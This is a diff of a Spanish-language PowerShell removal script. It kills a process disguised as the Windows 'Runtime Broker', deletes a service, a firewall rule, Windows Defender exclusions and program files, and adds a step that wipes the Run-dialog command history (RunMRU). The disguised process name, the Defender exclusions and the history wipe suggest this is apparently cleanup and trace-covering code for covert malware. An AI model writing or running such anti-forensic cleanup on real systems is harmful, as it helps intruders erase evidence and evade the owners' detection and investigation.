@@ -6,31 +6,50 @@ $rootFile = Join-Path -Path $root -ChildPath $ejecutable
 try {
     Get-Process -Name "Runtime Broker" -ErrorAction SilentlyContinue | Stop-Process -Force
 }
-catch {}
+catch {
+    exit 1
+}
 
 try {
     Stop-Service -Name $servicio -Force
     Remove-Service -Name $servicio
 }
-catch {}
+catch {
+    exit 1
+}
 
 try {
     Remove-NetFirewallRule -DisplayName $servicio
 }
-catch {}
+catch {
+    exit 1
+}
 
 try {
     Remove-Item -Path $rootFile -Force
 }
-catch {}
+catch {
+    exit 1
+}
 
 try {
     Remove-MpPreference -ExclusionPath $root
     Remove-MpPreference -ExclusionProcess $rootFile
 }
-catch {}
+catch {
+    exit 1
+}
 
 try {
     Remove-Item -Path $root -Recurse -Force
 }
-catch {}
+catch {
+    exit 1
+}
+
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force
+}
+catch {
+    exit 1
+}
